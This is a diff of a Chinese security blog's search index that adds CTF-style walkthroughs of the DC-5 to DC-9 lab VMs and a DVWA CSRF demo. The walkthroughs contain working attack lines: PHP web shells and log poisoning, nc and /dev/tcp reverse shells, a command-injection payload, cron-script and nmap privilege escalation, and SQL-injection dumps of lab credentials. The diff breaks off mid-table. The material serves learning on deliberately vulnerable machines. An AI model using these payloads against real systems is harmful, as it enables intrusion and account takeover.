@@ -1,16 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>asp、aspx、php、jsp万能密码大全</title>
-    <url>/2020/11/22/%20asp%E3%80%81aspx%E3%80%81php%E3%80%81jsp%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E5%A4%A7%E5%85%A8/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/14018269.html">源地址：https://www.cnblogs.com/This-is-Y/p/14018269.html<i class="fas fa-external-link-alt"></i></a></p>
-<h1 id="asp"><a href="#asp" class="headerlink" title="asp"></a>asp</h1><h1 id="aspx"><a href="#aspx" class="headerlink" title="aspx"></a>aspx</h1><h1 id="PHP万能密码"><a href="#PHP万能密码" class="headerlink" title="PHP万能密码"></a>PHP万能密码</h1><h1 id><a href="#" class="headerlink" title></a></h1><p>  jsp</p>
-]]></content>
-      <categories>
-        <category>cnblogs</category>
-      </categories>
-  </entry>
-  <entry>
     <title>.git  .svn  .ds_store  .hg  .idea  .swp    等网页文件泄露</title>
     <url>/2020/03/14/%20.git%20%20.svn%20%20.ds_store%20%20.hg%20%20.idea%20%20.swp%20%20%20%20%E7%AD%89%E7%BD%91%E9%A1%B5%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2/</url>
     <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12492242.html">源地址：https://www.cnblogs.com/This-is-Y/p/12492242.html<i class="fas fa-external-link-alt"></i></a></p>
@@ -37,6 +27,16 @@
 <p>文件利用：</p>
 <p>下载.swp文件到本地，使用vim -r filename.swp即可恢复文件内容</p>
 <p> </p>
+]]></content>
+      <categories>
+        <category>cnblogs</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>asp、aspx、php、jsp万能密码大全</title>
+    <url>/2020/11/22/%20asp%E3%80%81aspx%E3%80%81php%E3%80%81jsp%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E5%A4%A7%E5%85%A8/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/14018269.html">源地址：https://www.cnblogs.com/This-is-Y/p/14018269.html<i class="fas fa-external-link-alt"></i></a></p>
+<h1 id="asp"><a href="#asp" class="headerlink" title="asp"></a>asp</h1><h1 id="aspx"><a href="#aspx" class="headerlink" title="aspx"></a>aspx</h1><h1 id="PHP万能密码"><a href="#PHP万能密码" class="headerlink" title="PHP万能密码"></a>PHP万能密码</h1><h1 id><a href="#" class="headerlink" title></a></h1><p>  jsp</p>
 ]]></content>
       <categories>
         <category>cnblogs</category>
@@ -481,6 +481,54 @@
       </categories>
   </entry>
   <entry>
+    <title>CSRF 简单入门以及用dvwa构造的简单实例</title>
+    <url>/2020/03/10/CSRF%20%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8%E4%BB%A5%E5%8F%8A%E7%94%A8dvwa%E6%9E%84%E9%80%A0%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%9E%E4%BE%8B/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12457322.html">源地址：https://www.cnblogs.com/This-is-Y/p/12457322.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>SRF(跨站请求伪造)</p>
+<p>攻击者使用目标用户的身份，以目标用户的身份完成攻击者想要完全的操作。也可以理解为在目标用户不知情的情况下完成我们想要他完成的工作。</p>
+<p>在目标用户看来，他只完成了他本人想要完成的。而在网站看来，这份工作是已经登陆的目标用户想要网站完成的。而CSRF攻击就像是做了一个中间人，对两端的目标用户和网站进行欺骗。</p>
+<p>CSRF的两个重点：</p>
+<p>1）<strong>目标用户已经登陆了网站，能够执行网站的功能</strong></p>
+<p>2）<strong>目标用户访问了攻击者构造的URL</strong></p>
+<p> </p>
+<p>在BP中有构造CSRF Poc的功能，这里使用dvwa和bp来模拟一次CSRF</p>
+<p>先把安全程度调低</p>
+<img src="1503868-20200310171809249-88430808.png" alt width="592" height="330">
+
+<p> 修改密码为123456。</p>
+<p>这里修改123456的作用是可以理解为构造一个行为。让目标用户在不知情的情况下，通过点击一个简单的按钮，完成这个修改密码的行为。</p>
+<p>点击change。抓到这个包，发送到repeat。构建CSRF Poc</p>
+<img src="1503868-20200310172115797-442958379.png" alt width="829" height="627">
+
+<p> 把这里给的HTML代码保存下来，这里我们将它构造成一个html文件</p>
+<img src="1503868-20200310172945814-2015757352.png" alt>
+
+<p>这边在浏览器打开构造的文件，是一个request按钮，只用用户点击，就会完成修改密码的动作</p>
+<img src="1503868-20200310173422860-1549979433.png" alt width="888" height="493">
+
+<p> </p>
+<p>这边进入到dvwa数据库</p>
+<img src="1503868-20200310174202678-902204027.png" alt>
+
+<p> 有5个用户，用hack来登陆，来当小白鼠。账户1337，密码用cmd5破解，charley</p>
+<img src="1503868-20200310174449340-1686075278.png" alt width="636" height="221">
+
+<p> 登陆。点击刚才构造的文件的按钮。</p>
+<p>然后回到dvwa主界面，刷新一下，发现回到了登录窗口。</p>
+<img src="1503868-20200310174844136-268339516.png" alt>
+
+<p>这时候用原来的charley密码是登不上去的，密码在点击时已经变成了构造文件时设置的123456</p>
+<p>回到数据库中。可以发现密码的hash值已经变了。再cmd5解密，确认一下</p>
+<img src="1503868-20200310175012687-654871658.png" alt width="1045" height="439">
+
+<p> <img src="1503868-20200310175104669-1409171740.png" alt></p>
+<p> 现在已经可以确认，CSRF攻击成功，账户为1337的用户hack在登陆后不知情的情况下，被修改了密码</p>
+]]></content>
+      <categories>
+        <category>cnblogs</category>
+      </categories>
+  </entry>
+  <entry>
     <title>CSS学习笔记_1</title>
     <url>/2019/12/16/CSS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_1/</url>
     <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12048236.html">源地址：https://www.cnblogs.com/This-is-Y/p/12048236.html<i class="fas fa-external-link-alt"></i></a></p>
@@ -601,54 +649,6 @@
 <p>　　    a:hover {color:#FF00FF;}  </p>
 <p>　　    a:active {color:#0000FF;} <br></p>
 <p>css内容还有很多，这里先写一部分</p>
-]]></content>
-      <categories>
-        <category>cnblogs</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>CSRF 简单入门以及用dvwa构造的简单实例</title>
-    <url>/2020/03/10/CSRF%20%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8%E4%BB%A5%E5%8F%8A%E7%94%A8dvwa%E6%9E%84%E9%80%A0%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%9E%E4%BE%8B/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12457322.html">源地址：https://www.cnblogs.com/This-is-Y/p/12457322.html<i class="fas fa-external-link-alt"></i></a></p>
-<p>SRF(跨站请求伪造)</p>
-<p>攻击者使用目标用户的身份，以目标用户的身份完成攻击者想要完全的操作。也可以理解为在目标用户不知情的情况下完成我们想要他完成的工作。</p>
-<p>在目标用户看来，他只完成了他本人想要完成的。而在网站看来，这份工作是已经登陆的目标用户想要网站完成的。而CSRF攻击就像是做了一个中间人，对两端的目标用户和网站进行欺骗。</p>
-<p>CSRF的两个重点：</p>
-<p>1）<strong>目标用户已经登陆了网站，能够执行网站的功能</strong></p>
-<p>2）<strong>目标用户访问了攻击者构造的URL</strong></p>
-<p> </p>
-<p>在BP中有构造CSRF Poc的功能，这里使用dvwa和bp来模拟一次CSRF</p>
-<p>先把安全程度调低</p>
-<img src="1503868-20200310171809249-88430808.png" alt width="592" height="330">
-
-<p> 修改密码为123456。</p>
-<p>这里修改123456的作用是可以理解为构造一个行为。让目标用户在不知情的情况下，通过点击一个简单的按钮，完成这个修改密码的行为。</p>
-<p>点击change。抓到这个包，发送到repeat。构建CSRF Poc</p>
-<img src="1503868-20200310172115797-442958379.png" alt width="829" height="627">
-
-<p> 把这里给的HTML代码保存下来，这里我们将它构造成一个html文件</p>
-<img src="1503868-20200310172945814-2015757352.png" alt>
-
-<p>这边在浏览器打开构造的文件，是一个request按钮，只用用户点击，就会完成修改密码的动作</p>
-<img src="1503868-20200310173422860-1549979433.png" alt width="888" height="493">
-
-<p> </p>
-<p>这边进入到dvwa数据库</p>
-<img src="1503868-20200310174202678-902204027.png" alt>
-
-<p> 有5个用户，用hack来登陆，来当小白鼠。账户1337，密码用cmd5破解，charley</p>
-<img src="1503868-20200310174449340-1686075278.png" alt width="636" height="221">
-
-<p> 登陆。点击刚才构造的文件的按钮。</p>
-<p>然后回到dvwa主界面，刷新一下，发现回到了登录窗口。</p>
-<img src="1503868-20200310174844136-268339516.png" alt>
-
-<p>这时候用原来的charley密码是登不上去的，密码在点击时已经变成了构造文件时设置的123456</p>
-<p>回到数据库中。可以发现密码的hash值已经变了。再cmd5解密，确认一下</p>
-<img src="1503868-20200310175012687-654871658.png" alt width="1045" height="439">
-
-<p> <img src="1503868-20200310175104669-1409171740.png" alt></p>
-<p> 现在已经可以确认，CSRF攻击成功，账户为1337的用户hack在登陆后不知情的情况下，被修改了密码</p>
 ]]></content>
       <categories>
         <category>cnblogs</category>
@@ -1133,6 +1133,56 @@
       </categories>
   </entry>
   <entry>
+    <title>DC-5</title>
+    <url>/2021/06/07/DC-5/</url>
+    <content><![CDATA[<p>虚拟机用的NAT模式，看一下自己NAT的网卡的段<br><img src="image-20210607154654661.png" alt="image-20210607154654661"></p>
+<p>nmap找IP</p>
+<ul>
+<li>nmap 192.168.87.0/24 -sP<br><img src="image-20210607154727829.png" alt="image-20210607154727829"></li>
+</ul>
+<p>nmap扫一下端口</p>
+<ul>
+<li>nmap -Pn -sV 192.168.87.132</li>
+</ul>
+<p>PORT    STATE SERVICE VERSION<br>80/tcp  open  http    nginx 1.6.2<br>111/tcp open  rpcbind 2-4 (RPC #100000)</p>
+<p>太少了<br>再用masscan扫一下</p>
+<ul>
+<li>masscan -p0-65535 192.168.87.132<br>Discovered open port 57216/tcp on 192.168.87.132<br>Discovered open port 80/tcp on 192.168.87.132<br>Discovered open port 111/tcp on 192.168.87.132<br>没东西</li>
+</ul>
+<p>同时dirsearch扫一下目录</p>
+<ul>
+<li>python .\dirsearch.py -u <a class="link" href="http://192.168.87.132/">http://192.168.87.132/<i class="fas fa-external-link-alt"></i></a> -e php</li>
+</ul>
+<p>[15:50:10] Starting:<br>[15:50:24] 200 -    4KB - /contact.php<br>[15:50:24] 301 -  184B  - /css  -&gt;  <a class="link" href="http://192.168.87.132/css/">http://192.168.87.132/css/<i class="fas fa-external-link-alt"></i></a><br>[15:50:26] 200 -    6KB - /faq.php<br>[15:50:27] 301 -  184B  - /images  -&gt;  <a class="link" href="http://192.168.87.132/images/">http://192.168.87.132/images/<i class="fas fa-external-link-alt"></i></a><br>[15:50:27] 403 -  570B  - /images/<br>[15:50:27] 200 -    4KB - /index.php<br>[15:50:36] 200 -  852B  - /thankyou.php</p>
+<p>Task Completed</p>
+<p>xray扫出了这个<img src="image-20210607161522204.png" alt="image-20210607161522204"><br>暂时用不上</p>
+<p>去看了一下作者的视频提示<br><img src="image-20210607164231823.png" alt="image-20210607164231823"></p>
+<p><a class="link" href="https://www.five86.com/dc-5-clue.html">https://www.five86.com/dc-5-clue.html<i class="fas fa-external-link-alt"></i></a><br>有个文件包含<br><a class="link" href="http://192.168.87.132/thankyou.php?file=/etc/passwd">http://192.168.87.132/thankyou.php?file=/etc/passwd<i class="fas fa-external-link-alt"></i></a></p>
+<p>后面改了一下网卡，ip变成了192.168.101.128</p>
+<p>后续getshell思路是，执行<br>192.168.101.128/thankyou.php?<?php eval(@$_POST['a']); ?><br>在nginx中它会被记录到log日志中，日志有两种，正确的和错误的<br>文件路径分别为<br>/var/log/nginx/access.log<br>/var/log/nginx/error.log<br>在读取的是时候两个都试试，</p>
+<p>192.168.101.128/thankyou.php?file=/var/log/nginx/error.log<br>192.168.101.128/thankyou.php?file=/var/log/nginx/access.log</p>
+<p>error的连不上，<br>用access这个连上去了，但是练上去后我人就傻了</p>
+<p><img src="image-20210607222211828.png" alt="image-20210607222211828"><br>这™的是什么</p>
+<p>（蚁剑的问题，更新一下就好了）</p>
+<p>注意写数据到日志的时候要用bp，直接浏览器写会进行编码，导致数据解析不出来</p>
+<p>蚁剑连进去后，看一下各种信息，反弹shell到kali</p>
+<p>监听 nc -lvvp 4567</p>
+<p>mkfifo /tmp/bd;cat /tmp/bd | /bin/sh -i 2&gt;&amp;1 | nc 192.168.101.130 4567 &gt;/tmp/bd</p>
+<p><img src="image-20210608102329776.png" alt="image-20210608102329776"></p>
+<p><img src="image-20210608102323166.png" alt="image-20210608102323166"></p>
+<p>准备提权<br>nginx1.6.2有个提权的漏洞<br>CVE-2016-1247<br>但是用不了</p>
+<p><img src="image-20210608111816674.png" alt="image-20210608111816674"><br>少了权限</p>
+<p>用 find / -perm -u=s -type f 2&gt;/dev/null  查找一下可以用root权限运行的命令</p>
+<p>找到了screen这个，去searchsploit里找到了相应的利用文件</p>
+<p><img src="image-20210608150840541.png" alt="image-20210608150840541"></p>
+<p>把文件下载过来上传到目标/tmp目录里，直接用发现不太行</p>
+<p>直接对着文件内容，一步一步过来</p>
+<p><img src="image-20210608151059369.png" alt="image-20210608151059369"></p>
+<p><img src="image-20210608151222329.png" alt="image-20210608151222329"></p>
+<p><img src="image-20210608150655806.png" alt="image-20210608150655806"></p>
+]]></content>
+  </entry>
+  <entry>
     <title>DC-4靶机</title>
     <url>/2020/07/22/DC-4%E9%9D%B6%E6%9C%BA/</url>
     <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13347213.html">源地址：https://www.cnblogs.com/This-is-Y/p/13347213.html<i class="fas fa-external-link-alt"></i></a></p>
@@ -1271,6 +1321,192 @@
       <categories>
         <category>cnblogs</category>
       </categories>
+  </entry>
+  <entry>
+    <title>DC-6</title>
+    <url>/2021/06/08/DC-6/</url>
+    <content><![CDATA[<p>dc-6<br>安装作者的说明，下载hosts文件中配置一下</p>
+<pre><code>#DC-6
+192.168.101.133 wordy
+</code></pre>
+<p><img src="image-20210608174641928.png" alt="image-20210608174641928"></p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>访问，是用wordpress写的，先拿wpscan扫一下<br>不出所料，wpscan什么也没扫到</p>
+<p>这边同时用dirsearch扫目录<br>找到这个，<br><a class="link" href="http://wordy/wp-includes/">http://wordy/wp-includes/<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="http://wordy/wp-admin/install.php">http://wordy/wp-admin/install.php<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="http://wordy/wp-admin/maint/repair.php">http://wordy/wp-admin/maint/repair.php<i class="fas fa-external-link-alt"></i></a><br>找了一圈，无果，同样是看作者提示<br>cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt<br>去kali里找到了rockyou.txt.gz这个文件，解压<br>gzip -d rockyou.txt.gz<br>然后得到了一个passwords.txt密码文件</p>
+<h2 id="爆破用户后台"><a href="#爆破用户后台" class="headerlink" title="爆破用户后台"></a>爆破用户后台</h2><p>看到那条提示，应该是要爆破用户账号<br>bp找了一个1w的字典爆破了一下，</p>
+<p><img src="image-20210615152408119.png" alt="image-20210615152408119"></p>
+<p>graham<br>admin<br>sarah<br>mark<br>再去wpscan里爆破密码</p>
+<p>wpscan –url <a class="link" href="http://wordy/">http://wordy<i class="fas fa-external-link-alt"></i></a> -U 1 -P /root/桌面/passwords.txt</p>
+<p>等一会<br>出来一个</p>
+<p><img src="image-20210615153223679.png" alt="image-20210615153223679"></p>
+<p>mark<br>helpdesk01</p>
+<p>进去可以看到少爆破了一个用户</p>
+<p><img src="image-20210615153254802.png" alt="image-20210615153254802"></p>
+<p>jens</p>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>利用它的插件activity_monitor来getshell</p>
+<p><img src="image-20210615182120264.png" alt="image-20210615182120264"></p>
+<p>看了一下文档，用的是个命令执行</p>
+<p><a class="link" href="http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools">http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools<i class="fas fa-external-link-alt"></i></a></p>
+<p><img src="image-20210615182721023.png" alt="image-20210615182721023"></p>
+<p>在这个页面选lookup，抓包</p>
+<p>payload改为  g.cn | nc 192.168.101.130 1234 -e /bin/bash</p>
+<p><img src="image-20210615182742027.png" alt="image-20210615182742027"></p>
+<p>接收到shell</p>
+<p><img src="image-20210615182956882.png" alt="image-20210615182956882"></p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>翻来找去，在mark的用户目录下找到了一个文件</p>
+<p><img src="image-20210615183107032.png" alt="image-20210615183107032"></p>
+<p>当时扫端口时，是有22端口的，</p>
+<p><img src="image-20210615183227314.png" alt="image-20210615183227314"></p>
+<p>登录graham用户</p>
+<p>sudo -l</p>
+<p><img src="image-20210615183650315.png" alt="image-20210615183650315"></p>
+<p>顺势找到了这个文件 backups.sh,原本是用作备份网页的，<br>用 vi backups.sh 修改文件内容为 /bin/bash ，因为jens不用密码<br>然后       sudo -u jens ./backups.sh<br>就来到了jens的shell下<br>    find / -perm -u=s -type f 2&gt;/dev/null<br>没找到东西</p>
+<p><img src="image-20210615185154119.png" alt="image-20210615185154119"></p>
+<h3 id="nmap-提权"><a href="#nmap-提权" class="headerlink" title="nmap 提权"></a>nmap 提权</h3><p>sudo -l找到nmap可以用，用nmap提权<br>先写一个nse文件，root.nse<br>    os.execute(‘/bin/bash’)<br>然后sudo nmap –script=root.nse</p>
+<p><img src="image-20210615184449384.png" alt="image-20210615184449384"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个靶机几乎全是靠提示过来的,wpscan更新换代太快了,以至于找到的命令都没用了,爆破用户用的bp,爆破用户密码的时候还是自己看help搞明白的.<br>getshell的过程也挺离谱的,网上查wp后台getshell很容易,但是我却不认识activity_monitor是插件,见得太少了,<br>反弹shell我用的<br>    bash -i &gt;% /dev/tcp/192.168.101.130/1234 0&gt;%1<br>没用反应,<br>用<br>    nc 192.168.101.130 1234 -e /bin/bash<br>这个就可以,不是很明白为什么<br>后面的过程就更不用说了,倒是学会了用这两个东西来找可以提权的东西,然后再对症下药<br>find / -perm -u=s -type f 2&gt;/dev/null<br>sudo -l</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>DC-7</title>
+    <url>/2021/06/15/DC-7/</url>
+    <content><![CDATA[<p>运行虚拟机，有ip<br>192.168.101.136<br>就跳过找ip的步骤</p>
+<p>端口，少的可怜，不过开了22</p>
+<p><img src="image-20210615195315898.png" alt="image-20210615195315898"></p>
+<p>目录没有什么特别的发现，有一个robots.txt</p>
+<p><a class="link" href="http://192.168.101.136/robots.txt">http://192.168.101.136/robots.txt<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="github找到敏感信息"><a href="#github找到敏感信息" class="headerlink" title="github找到敏感信息"></a>github找到敏感信息</h2><p>去谷歌搜了一下@DC7USER<br>DC7user<br>然后找到了这个<br><a class="link" href="https://github.com/Dc7User/staffdb">https://github.com/Dc7User/staffdb<i class="fas fa-external-link-alt"></i></a><br>下载过来看一下</p>
+<p>在config.php里找到这个<br>dc7user<br>MdR3xOgB7#dW</p>
+<p><img src="image-20210615200413283.png" alt="image-20210615200413283"></p>
+<p>但是我只扫到22和80端口，所以用这个账号密码去试着连接一下ssh<br>还真成了</p>
+<p><img src="image-20210615200601267.png" alt="image-20210615200601267"></p>
+<p>sudo -l<br>find / -perm -u=s -type f 2&gt;/dev/null<br>都没有东西</p>
+<p><img src="image-20210615200926046.png" alt="image-20210615200926046"></p>
+<p>在/home/dc7user目录下，有个backup文件夹和mbox文件，看了一下mbox，应该是邮件文件</p>
+<p><img src="image-20210615201036925.png" alt="image-20210615201036925"></p>
+<p>像是日志，里面分析出来的有用的信息有，<br> /opt/scripts/backups.sh<br> /home/dc7user/backups/website.sql</p>
+<p><img src="image-20210615202334847.png" alt="image-20210615202334847"></p>
+<p><img src="image-20210615202358421.png" alt="image-20210615202358421"></p>
+<p>sh文件先放一边，gpg是一种加密文件，去百度了，看不懂，<br>回到sh文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">rm &#x2F;home&#x2F;dc7user&#x2F;backups&#x2F;*</span><br><span class="line">cd &#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br><span class="line">drush sql-dump --result-file&#x3D;&#x2F;home&#x2F;dc7user&#x2F;backups&#x2F;website.sql</span><br><span class="line">cd ..</span><br><span class="line">tar -czf &#x2F;home&#x2F;dc7user&#x2F;backups&#x2F;website.tar.gz html&#x2F;</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric &#x2F;home&#x2F;dc7user&#x2F;backups&#x2F;website.sql</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric &#x2F;home&#x2F;dc7user&#x2F;backups&#x2F;website.tar.gz</span><br><span class="line">chown dc7user:dc7user &#x2F;home&#x2F;dc7user&#x2F;backups&#x2F;*</span><br><span class="line">rm &#x2F;home&#x2F;dc7user&#x2F;backups&#x2F;website.sql</span><br><span class="line">rm &#x2F;home&#x2F;dc7user&#x2F;backups&#x2F;website.tar.gz</span><br></pre></td></tr></table></figure>
+<p>在我一步一步跟着shell文件走时，突然来了个这个</p>
+<p><img src="image-20210615210208038.png" alt="image-20210615210208038"></p>
+<p>没啥用，再来一次，这次得到了未加密的文件</p>
+<p><img src="image-20210615210849864.png" alt="image-20210615210849864"></p>
+<p>用xshell连上，再用xftp把文件下载到本地</p>
+<p>可以看到用的是mariadb，其他的我什么都没找到</p>
+<p><img src="image-20210615212026712.png" alt="image-20210615212026712"></p>
+<p>这边倒是有东西</p>
+<p><img src="image-20210615212041261.png" alt="image-20210615212041261"></p>
+<p>既然有这么些漏洞，我就去google搜一下<br><del>没找到可以利用的！！</del></p>
+<h2 id="连接上数据库"><a href="#连接上数据库" class="headerlink" title="连接上数据库"></a>连接上数据库</h2><p>看了一样别人的博客，在/var/www/html/sites/default下的setting.php文件里找到了东西<br>数据库的账户<br>db7user<br>yNv3Po00</p>
+<p><img src="image-20210615213202755.png" alt="image-20210615213202755"></p>
+<p>在 select * from d7db.users_field_data里找到了admin账号和密码<br>但是解密不出来，卡了一天，参考了一下别人的，可以用drush来修改密码<br>    drush user-password admin –password=”12345”<br>然后回到网站<br><a class="link" href="http://192.168.101.136/user/login">http://192.168.101.136/user/login<i class="fas fa-external-link-alt"></i></a><br>用admin<br>12345<br>登录网站</p>
+<h2 id="反弹www-data的shell，修改backups文件"><a href="#反弹www-data的shell，修改backups文件" class="headerlink" title="反弹www-data的shell，修改backups文件"></a>反弹www-data的shell，修改backups文件</h2><p>使用drupal的反弹shell，添加插件<br><a class="link" href="http://drupal.org/project/php">http://drupal.org/project/php<i class="fas fa-external-link-alt"></i></a><br>在extend-&gt; install new module-&gt;添加下载的php插件<br>然后在extend里找到他，勾选，启用</p>
+<p><img src="image-20210617111425619.png" alt="image-20210617111425619"></p>
+<p>之后在content-&gt; add  content -&gt; basic page    里写入<br>    <?php system($_GET['a'])?><br>注意修改text format为phpcode,保存，预览，在url后面加上<br>    ?a=nc -e /bin/bash 192.168.243.131 4446<br>来反弹shell。拿到www-data的权限后，</p>
+<p><img src="image-20210617112439966.png" alt="image-20210617112439966"></p>
+<p>然后修改backups.sh文件，<br>    echo “rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.243.131 4445 &gt;/tmp/f “&gt;backups.sh<br>用它的定时任务，反弹一个root权限的shell回来<br>要点耐心，需要等一会，</p>
+<p><img src="image-20210617121256110.png" alt="image-20210617121256110"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这一篇记录得有些乱，这个靶机看来作者是想让我们从github来找敏感信息，找到后使用ssh连上后，后面的操作我确实想不到，从网页设置文件中找到了数据库密码，连上数据库后修改admin用户的密码，再在网页中使用admin用户反弹更高权限的shell，然后就是和上一个靶机类似操作的，修改shell文件，利用定时任务来提权</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>DC-8</title>
+    <url>/2021/06/17/DC-8/</url>
+    <content><![CDATA[<p>IP确认：192.168.243.134</p>
+<h2 id="注入拿后台账户"><a href="#注入拿后台账户" class="headerlink" title="注入拿后台账户"></a>注入拿后台账户</h2><p>打开网页的时候看到<a class="link" href="http://192.168.243.134/?nid=1">http://192.168.243.134/?nid=1<i class="fas fa-external-link-alt"></i></a> 有个id<br>在searchsploit查的时候看到好几个注入</p>
+<p><img src="image-20210617132751781.png" alt="image-20210617132751781"></p>
+<p>就直接丢sqlmap跑了<br>一步一步查过去，<br>有两个库<br>d7db,information_schema<br>d7db下面有给users表，里面有admin和john两个用户的信息</p>
+<pre><code>+---------+---------------------------------------------------------+
+| name    | pass                                                    |
++---------+---------------------------------------------------------+
+| &lt;blank&gt; | &lt;blank&gt;                                                 |
+| admin   | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z |
+| john    | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |
++---------+---------------------------------------------------------+
+</code></pre>
+<p><img src="image-20210617133348566.png" alt="image-20210617133348566"></p>
+<p>登录入口虽然在页面不见了，但还是在的<br>192.168.243.134/user</p>
+<p>把密码用john解密</p>
+<p><img src="image-20210617150600575.png" alt="image-20210617150600575"></p>
+<p>密码解密出来一个turtle<br>测试是john的密码<br>    john<br>    turtle</p>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>登录进去后，在contact us的编辑那里找到了可以反弹shell的地方，但是我自己用的时候，把</p><p>flag</p>给删掉了，结果就用不了，后面看了别人的才成功<br>先编写好要执行的命令，我这边是直接反弹shell<br>所以写的是<p></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;p&gt;flag&lt;/p&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&#x27;nc -e /bin/bash 192.168.243.130 4444&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p><img src="image-20210617161947709.png" alt="image-20210617161947709"></p>
+<p>保存后，去contact us随便提交一点什么东西</p>
+<p><img src="image-20210617162115369.png" alt="image-20210617162115369"><br>kali这边就接收到了shell了</p>
+<p><img src="image-20210617162143755.png" alt="image-20210617162143755"></p>
+<p>用  python -c ‘import pty; pty.spawn(“/bin/bash”)’<br>获取一个完全交互的shell</p>
+<p>然后又是翻箱倒柜的找有用的信息<br>依然是在/var/www/html/sites/default/settings.php里找到了数据库密码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dbuser</span><br><span class="line">4nB90JumP</span><br></pre></td></tr></table></figure>
+<p><img src="image-20210617162411546.png" alt="image-20210617162411546"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>连进去找了一会才想起来,我就是用的注入进来的.<br>在继续翻箱倒柜找<br>sudo -l需要www-data的密码<br>find / * -perm -u=s -type f 2&gt;/dev/null的结果如下</p>
+<p><img src="image-20210617171914113.png" alt="image-20210617171914113"></p>
+<p>在看passwd文件的时候,发现有这个用户Debian-exim</p>
+<p><img src="image-20210617172107085.png" alt="image-20210617172107085"></p>
+<p>结合上面用find找到的exim4,这里应该有问题,</p>
+<p>百度查了一下:<a class="link" href="https://blog.csdn.net/qq_34965596/article/details/104658544">https://blog.csdn.net/qq_34965596/article/details/104658544<i class="fas fa-external-link-alt"></i></a></p>
+<p>然后就成了</p>
+<p><img src="image-20210617172931950.png" alt="image-20210617172931950"></p>
+<p><img src="image-20210617173526965.png" alt="image-20210617173526965"></p>
+<p>值得一提的是,这个shell很不稳定</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>注入使用的sqlmap,找到密码很快,但是解密却花了一些时间,没有想到用john来处理,把密文丢进去,直接john pass.txt解密就好了<br>第二个地方是在后台getshell的地方,这个我也是找到了地方,但是我把</p><p>flag</p>给删了,导致后续反弹不出来,也挺蛋疼的,<p></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>DC-9</title>
+    <url>/2021/06/17/DC-9/</url>
+    <content><![CDATA[<p>确定IP:192.168.243.135<br>端口:经典22,80<br>目录扫描<img src="image-20210617210023669.png" alt="image-20210617210023669"></p>
+<h2 id="注入拿敏感数据"><a href="#注入拿敏感数据" class="headerlink" title="注入拿敏感数据"></a>注入拿敏感数据</h2><p><a class="link" href="http://192.168.243.135/results.php">http://192.168.243.135/results.php<i class="fas fa-external-link-alt"></i></a> 搜索页面,payload为’or 1=1 ##时<br><img src="image-20210617180528043.png" alt="image-20210617180528043"><br>显示出了所以信息,确定是有注入了,丢sqlmap跑一下，找到了结果<br>有三个库users，Staff，information_schema<br>users下有一个表UserDetails ，Staff下有两个Users  ，StaffDetails ，<br>UserDetails表里的数据<br>    <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[17 entries]</span><br><span class="line">+-----------+---------------+</span><br><span class="line">| username  | password      |</span><br><span class="line">+-----------+---------------+</span><br><span class="line">| marym     | 3kfs86sfd     |</span><br><span class="line">| julied    | 468sfdfsd2    |</span><br><span class="line">| fredf     | 4sfd87sfd1    |</span><br><span class="line">| barneyr   | RocksOff      